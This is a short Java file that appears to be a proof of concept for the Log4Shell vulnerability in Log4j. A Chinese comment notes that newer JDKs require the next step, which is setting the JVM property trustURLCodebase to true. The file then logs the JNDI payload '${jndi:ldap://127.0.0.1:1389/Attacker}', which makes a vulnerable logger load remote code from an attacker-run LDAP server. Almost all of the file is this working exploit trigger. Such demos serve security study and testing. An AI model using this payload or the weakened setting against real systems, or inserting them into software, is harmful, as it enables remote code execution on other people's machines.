import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LogService {

    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        // 6u211 7u201 8u191 11.0.1 以上版本需要设置trustURLCodebase=true
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://127.0.0.1:1389/Attacker}");
    }
}
